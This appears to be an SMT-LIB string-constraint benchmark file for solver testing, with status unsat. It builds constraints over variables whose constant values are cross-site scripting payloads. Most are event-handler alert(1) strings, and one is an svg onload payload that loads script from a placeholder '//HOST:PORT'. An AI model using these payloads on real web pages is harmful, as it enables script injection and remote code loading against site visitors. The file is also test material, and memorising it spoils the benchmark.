; random_mix, BMP mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status unsat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>") (= x "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>") (= x "<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>")))
(assert (or (= z """animation-name:x"" onanimationstart=""alert(1)""></big>") (= z "ctivate=alert(1)></b>") (= z "dragenter=""alert(1)"">test</shadow>")))
(assert (= y (str.++ x z)))
(assert (or (str.contains y """ale") (str.suffixof "t</cite>" x)))
(assert (or (= "ert(1)></b" (str.substr z 10 10)) (not (= "<style>:target {transform: rotate(180dex;}</style><hgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hgroup>=""alert(1)"">test</textarea>" (str.replace y "g)" "x")))))
(assert (= (str.indexof z "e" 0) 6))
(assert (or (str.in_re y ((_ re.from_regex ecma2020) "^\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$")) (str.in_re z ((_ re.from_regex ecma2020) "^\(?([0-9]{3})\)?[-.\u{25cf}]?([0-9]{3})[-.\u{25cf}]?([0-9]{4})$")) (not (= (str.indexof x "ppen" 0) 55))))
(assert (= (str.len x) 113))
(assert (or (not (str.in_re y ((_ re.from_regex ecma2020) "^\s*1\d{10}\s*$"))) (str.suffixof "big>" z)))
(assert (or (= (str.at y 33) "e") (not (str.prefixof "&lt;?im" x))))
(assert (or (= (str.len z) 21) (not (= "ctivate=alert/b>" (str.replace z "(1)><" "")))))
(check-sat)
